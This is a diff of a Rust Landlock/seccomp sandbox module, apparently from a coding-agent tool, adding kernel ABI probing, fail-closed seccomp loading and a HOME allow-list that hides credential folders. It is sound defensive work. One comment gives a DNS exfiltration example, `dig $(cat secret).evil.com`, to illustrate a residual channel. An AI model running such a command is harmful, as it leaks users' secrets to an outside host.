@@ -9,11 +9,23 @@
 //! `Command::pre_exec` 在**子进程** fork 后 exec 前调用 `restrict_self()`。父进程
 //! 不被约束，子进程 exec 后 Landlock 约束持久保持（LSM 级跨 exec）。
 //!
+//! feature `seccomp` 开启时（默认不开）：父进程侧还预先构建危险 syscall
+//! 拒绝过滤器（见 `crate::seccomp`），pre_exec 闭包在 landlock `FullyEnforced`
+//! 后追加一次 `seccomp_load`——两层任一失败都使 exec 中止（fail-closed）。
+//!
 //! ## 旧内核降级
 //!
 //! `landlock_available()` 用 `HardRequirement` + `create()` 探测内核支持（不约束
 //! 探测进程）。内核 < 5.13 或 Landlock 未启用时返回 `false`，`detect_driver()`
 //! 据此降级 `NoopDriver` + warn（C-22）。
+//!
+//! **分级降级**：5.13 ≤ 内核 < 6.7 时，FS 限制按
+//! 实际支持的 ABI 生效（V1/V2/V3 逐级试探，`build_ruleset` 只 handle 探测通过
+//! 的访问集），网络 TCP 拒绝（需 ABI≥4）自动跳过并 warn——此前 ruleset 以
+//! BestEffort 同时 handle FS(V3)+Net(ABI4)，pre_exec 对 `PartiallyEnforced`
+//! 直接报错，导致这些内核**每次 spawn 必失败**并把用户推向关闭沙箱。现在：
+//! 全部 handle 均为探测确认可全量执行的能力，pre_exec 的 `FullyEnforced`
+//! 严格校验保持成立（fail-closed 不变式不放松）。
 //!
 //! ## VCS 保护限制
 //!
@@ -29,10 +41,6 @@ use landlock::{RulesetAttr, RulesetCreatedAttr};
 use minicoding_core::sandbox::{SandboxDriver, SandboxError, SandboxPolicy};
 use std::os::unix::process::CommandExt;
 use std::path::PathBuf;
-
-/// Landlock ABI 上限（V3 = Linux 6.2，含 Truncate，覆盖 `std::fs::write` 等常见写操作）。
-/// `BestEffort` 兼容模式下自动降到内核实际支持版本。
-const TARGET_ABI: landlock::ABI = landlock::ABI::V3;
 
 /// 只读放行的系统路径（命令/库/设备/proc 必须可读，否则子进程无法 exec）。
 const SYSTEM_RO_PATHS: &[&str] = &[
@@ -104,11 +112,51 @@ pub fn landlock_available() -> bool {
         .is_some()
 }
 
-/// 在子进程 `pre_exec` 内应用 Landlock 限制。
+/// 探测内核实际支持的 Landlock FS ABI（分级降级）。
 ///
-/// 父进程构建 `RulesetCreated`（打开 `PathFd`、`add_rule`），子进程 `pre_exec` 内仅
-/// `restrict_self()`。`Option::take()` 模式解决 `restrict_self(self)` 的 `FnOnce`
-/// 语义与 `pre_exec` 要求 `FnMut` 的冲突。
+/// 从高到低逐级 `HardRequirement` 试探 V3/V2/V1，返回最高可用版本；全不支持
+/// 返回 `None`（调用方应走 `NoopDriver` 路径）。探测仅 create ruleset 不约束
+/// 当前进程。`pub` 供 doctor 如实报告（此前固定宣称 "V3 target ABI" 与实际
+/// 执行的 ABI 不符）。
+#[must_use]
+pub fn probe_fs_abi() -> Option<landlock::ABI> {
+    use landlock::{Access, CompatLevel, Compatible, Ruleset};
+
+    for abi in [landlock::ABI::V3, landlock::ABI::V2, landlock::ABI::V1] {
+        let ok = Ruleset::default()
+            .set_compatibility(CompatLevel::HardRequirement)
+            .handle_access(landlock::AccessFs::from_all(abi))
+            .ok()
+            .and_then(|r| r.create().ok())
+            .is_some();
+        if ok {
+            return Some(abi);
+        }
+    }
+    None
+}
+
+/// 探测内核是否支持 Landlock 网络原语（ABI≥4 / Linux 6.7+）。
+/// `pub` 供 doctor 如实报告网络限制可用性。
+#[must_use]
+pub fn net_restriction_supported() -> bool {
+    use landlock::{CompatLevel, Compatible, Ruleset};
+
+    Ruleset::default()
+        .set_compatibility(CompatLevel::HardRequirement)
+        .handle_access(landlock::AccessNet::BindTcp | landlock::AccessNet::ConnectTcp)
+        .ok()
+        .and_then(|r| r.create().ok())
+        .is_some()
+}
+
+/// 在子进程 `pre_exec` 内应用 Landlock 限制（feature `seccomp` 开启时追加
+/// seccomp 加载）。
+///
+/// 父进程构建 `RulesetCreated`（打开 `PathFd`、`add_rule`）与 seccomp 过滤器
+/// （`add_arch`/`add_rule`），子进程 `pre_exec` 内仅 `restrict_self()` +
+/// `seccomp load`。`Option::take()` 模式解决两者的一次性消费语义与 `pre_exec`
+/// 要求 `FnMut` 的冲突。
 fn apply_landlock(
     policy: &SandboxPolicy,
     cmd: &mut std::process::Command,
@@ -116,12 +164,26 @@ fn apply_landlock(
     let ruleset = build_ruleset(policy)?;
     let mut ruleset_slot = Some(ruleset);
 
+    // 父进程侧预先完成 seccomp 过滤器全部构建工作（堆分配集中在 fork 前），
+    // pre_exec 闭包内仅剩一次 `load()`。构建失败使 spawn 失败（fail-closed，
+    // 与 landlock FullyEnforced 校验同一哲学）。
+    #[cfg(feature = "seccomp")]
+    let mut seccomp_slot = Some(crate::seccomp::prepare_deny_filter()?);
+
     // SAFETY: pre_exec 闭包在 fork 后、exec 前的子进程内运行（单线程上下文）。
     // 闭包体内仅做：Option::take（栈操作）+ restrict_self（两个 syscall：
     // landlock_restrict_self + prctl(PR_SET_NO_NEW_PRIVS)）+ 构造栈上
-    // RestrictionStatus + drop RulesetCreated（close fd，close(2) async-signal-safe）。
-    // 成功路径无堆分配、无锁、无 malloc，满足 POSIX async-signal-safe 要求。
-    // 错误路径的 to_string 分配仅发生在即将 exec 失败时，可接受。
+    // RestrictionStatus + drop RulesetCreated（close fd，close(2) async-signal-safe）
+    // + feature "seccomp" 时一次 seccomp_load。
+    //
+    // **诚实边界**：libseccomp 的 `load()` 内部会堆分配（构造 BPF 程序缓冲区），
+    // 严格说不是 async-signal-safe。采用 Chromium 同款实践：fork 后 exec 前是
+    // 单线程窗口，子进程不会与父进程并发竞争 malloc 锁；残余风险仅为"fork 瞬间
+    // 恰有其他线程持有 malloc 锁导致子进程内分配死锁"，业界（Chromium/
+    // sandboxed-process 实践）已知并接受该风险——构建阶段已前移至父进程，此处
+    // 只剩单次 load 分配，窗口最小化。
+    // 成功路径其余部分无堆分配、无锁；错误路径的 to_string 分配仅发生在即将
+    // exec 失败时，可接受。
     unsafe {
         cmd.pre_exec(move || {
             let rs = ruleset_slot
@@ -131,14 +193,25 @@ fn apply_landlock(
                 .restrict_self()
                 .map_err(|e| std::io::Error::other(e.to_string()))?;
             match status.ruleset {
-                landlock::RulesetStatus::FullyEnforced => Ok(()),
-                landlock::RulesetStatus::PartiallyEnforced => Err(std::io::Error::other(format!(
-                    "landlock only partially enforced: {status:?}"
-                ))),
-                landlock::RulesetStatus::NotEnforced => Err(std::io::Error::other(format!(
-                    "landlock not enforced: {status:?}"
-                ))),
+                landlock::RulesetStatus::FullyEnforced => {}
+                landlock::RulesetStatus::PartiallyEnforced => {
+                    return Err(std::io::Error::other(format!(
+                        "landlock only partially enforced: {status:?}"
+                    )));
+                }
+                landlock::RulesetStatus::NotEnforced => {
+                    return Err(std::io::Error::other(format!(
+                        "landlock not enforced: {status:?}"
+                    )));
+                }
             }
+            // landlock 全量生效后才加载 seccomp（两层防线顺序保证：任一层失败
+            // 都使 exec 中止，不存在"半沙箱"子进程逃逸到用户命令）
+            #[cfg(feature = "seccomp")]
+            if let Some(filter) = seccomp_slot.take() {
+                crate::seccomp::load_prepared(&filter)?;
+            }
+            Ok(())
         });
     }
     Ok(())
@@ -150,16 +223,36 @@ fn apply_landlock(
 /// - `WorkspaceWrite`：workdir + writable 可写，其余只读，VCS 目录列入只读
 ///   （注：landlock 并集语义下 workdir 可写会使 .git 继承可写，VCS 实际写保护
 ///   由应用层 builtin 黑名单补充（已落地），见模块文档）。
+#[allow(clippy::too_many_lines)] // 策略分解+ 分级降级注释与规则添加线性展开，拆分降低可读性
 fn build_ruleset(policy: &SandboxPolicy) -> Result<landlock::RulesetCreated, SandboxError> {
     use landlock::{Access, path_beneath_rules};
 
-    let handled = landlock::AccessFs::from_all(TARGET_ABI);
-    let ro_access = landlock::AccessFs::from_read(TARGET_ABI);
-    let write_access = landlock::AccessFs::from_all(TARGET_ABI);
+    //  分级降级：只 handle 探测确认可全量执行的访问集。FS 按实际支持
+    // ABI；网络仅在内核支持（ABI≥4）时启用——否则 BestEffort 静默降级会让
+    // pre_exec 的 FullyEnforced 校验失败（PartiallyEnforced），spawn 必败。
+    let fs_abi = probe_fs_abi().ok_or_else(|| {
+        SandboxError::Sandbox("landlock FS 限制不可用（应先经 landlock_available 探测）".into())
+    })?;
+    let restrict_net_requested = matches!(
+        policy,
+        SandboxPolicy::ReadOnly | SandboxPolicy::WorkspaceWrite { .. }
+    );
+    let net_supported = net_restriction_supported();
+    if restrict_net_requested && !net_supported {
+        tracing::warn!(
+            "landlock network restriction unavailable on this kernel \
+             (requires ABI>=4 / Linux 6.7+): child TCP/UDP/DNS are NOT restricted"
+        );
+    }
+    let restrict_net = restrict_net_requested && net_supported;
+
+    let handled = landlock::AccessFs::from_all(fs_abi);
+    let ro_access = landlock::AccessFs::from_read(fs_abi);
+    let write_access = landlock::AccessFs::from_all(fs_abi);
 
     // 网络限制：
     // ReadOnly/WorkspaceWrite 下拒绝子进程 TCP bind/connect（landlock ABI≥4，
-    // Linux 6.7+；旧内核 Compatible 模式自动忽略该 handle——best-effort）。
+    // Linux 6.7+；旧内核经上方探测自动跳过并 warn—— 分级降级）。
     // 不为网络添加任何 allow 规则 = 全部拒绝。web.fetch 在主进程内执行不受
     // 影响（沙箱只作用于 spawn 的子进程）；需要子进程联网用 external-sandbox/
     // danger-full-access。
@@ -167,12 +260,10 @@ fn build_ruleset(policy: &SandboxPolicy) -> Result<landlock::RulesetCreated, San
     // **诚实边界**：landlock ABI4 网络原语仅覆盖
     // TCP——UDP/DNS/ICMP/raw socket **不受限**，"deny all TCP"≠断网。沙箱子
     // 进程仍可用 DNS 查询（`dig $(cat secret).evil.com`）或任意 UDP 报文对外
-    // 通信。彻底封堵需 seccomp（待接入，见 tech-stack.md §13）；在 seccomp
-    // 落地前，doctor 与文档必须如实描述该残留通道。
-    let restrict_net = matches!(
-        policy,
-        SandboxPolicy::ReadOnly | SandboxPolicy::WorkspaceWrite { .. }
-    );
+    // 通信。A1 seccomp 为 deny-list 策略（只封危险 syscall，不碰网络类，
+    // 见 `seccomp.rs` 模块文档），UDP/DNS 通道由应用层 DNS 解析-连接 IP
+    // pinning（`minicoding-tools::web`）另行处理；doctor 与文档须如实
+    // 描述该边界。
     let mut ruleset = make_base_ruleset(handled, restrict_net)?
         .create()
         .map_err(|e| SandboxError::Sandbox(e.to_string()))?;
@@ -191,21 +282,26 @@ fn build_ruleset(policy: &SandboxPolicy) -> Result<landlock::RulesetCreated, San
         ))
         .map_err(|e| SandboxError::Sandbox(e.to_string()))?;
 
-    // HOME 只读 + TMPDIR 读写：landlock
-    // 未列入规则的路径**连读都拒绝**——此前 $HOME/.cargo、~/.ssh 全不可读，
-    // /tmp 不可写，cargo build/编译器/测试框架大概率直接失败，把用户推向
-    // external-sandbox/danger-full-access 的安全侵蚀压力。HOME 只读满足
-    // registry 缓存/配置读取；TMPDIR 读写满足编译临时目录。
+    // HOME 细粒度只读白名单+ TMPDIR 读写：landlock 未列入规则的路径
+    // **连读都拒绝**——白名单覆盖工具链/缓存常见落点（cargo/rustup/config/
+    // cache/local/nvm/volta/npm/go），满足编译与包管理读取需求；TMPDIR 读写
+    // 满足编译临时目录。
     //
-    // **诚实边界**：HOME 整体只读放行意味着沙箱
-    // 内命令可读取 `~/.ssh`、`~/.aws` 等全部用户凭证并复制进可写的 workdir。
-    // 这是可用性/安全的显式取舍——细粒度 HOME 白名单（仅 .cargo/registry 等）
-    // 列为后续增强（需 roadmap 立项）。
-    if let Ok(home) = std::env::var("HOME")
-        && !home.is_empty()
-    {
+    // **诚实边界（收敛，§6.2-S4 修复）**：旧语义对 $HOME
+    // 整体只读放行，沙箱内命令可读取 `~/.ssh`、`~/.aws`、`~/.gnupg` 等全部用户
+    // 凭证并复制进可写的 workdir。收敛为白名单后凭证目录不再可读；代价是
+    // 白名单外的私有工具链在沙箱内不可见——此类场景走 external-sandbox 兜底。
+    let home_allow = crate::hardening::home_read_allow_paths();
+    if !home_allow.is_empty() {
+        tracing::info!(
+            paths = ?home_allow,
+            "landlock HOME 读白名单生效（凭证目录不可读）"
+        );
         ruleset = ruleset
-            .add_rules(path_beneath_rules([home.as_str()], ro_access))
+            .add_rules(path_beneath_rules(
+                home_allow.iter().map(PathBuf::as_path),
+                ro_access,
+            ))
             .map_err(|e| SandboxError::Sandbox(e.to_string()))?;
     }
     let tmpdir = std::env::var("TMPDIR").unwrap_or_else(|_| "/tmp".to_string());
@@ -285,8 +381,11 @@ fn build_ruleset(policy: &SandboxPolicy) -> Result<landlock::RulesetCreated, San
 
 /// 构造基础 Ruleset：fs handle 全量 + 可选 TCP 网络拒绝（`restrict_net`）。
 ///
-/// 网络拒绝语义见 [`build_ruleset`] 内注释——landlock 仅支持 TCP 原语，
-/// UDP/DNS 残留通道由 seccomp（待接入）封堵。
+/// `restrict_net` 由调用方经 [`net_restriction_supported`] 探测后决定，
+/// 本函数不再做 `BestEffort` 静默降级——所有 handle 均可全量执行，保证
+/// `restrict_self()` 返回 `FullyEnforced`。网络仅覆盖 TCP 原语，UDP/DNS 残留
+/// 通道由应用层 IP pinning处理；危险 syscall 由 seccomp deny-list
+/// （feature gate）拦截。
 fn make_base_ruleset(
     handled: landlock::BitFlags<landlock::AccessFs>,
     restrict_net: bool,
@@ -315,6 +414,24 @@ mod tests {
     fn landlock_available_does_not_panic() {
         // 仅验证探测函数可调用、不 panic；实际 true/false 取决于内核
         let _ = landlock_available();
+    }
+
+    #[test]
+    fn probe_fs_abi_matches_availability() {
+        // landlock_available()（V1 探测）为真时，probe_fs_abi 必须返回
+        // Some（至少 V1 可用）；为假时两者应一致为不支持。
+        let available = landlock_available();
+        assert_eq!(
+            probe_fs_abi().is_some(),
+            available,
+            "probe_fs_abi 与 landlock_available 探测结论不一致"
+        );
+    }
+
+    #[test]
+    fn net_probe_does_not_panic() {
+        // 实际 true/false 取决于内核（ABI>=4）；仅验证可调用、不 panic
+        let _ = net_restriction_supported();
     }
 
     #[test]
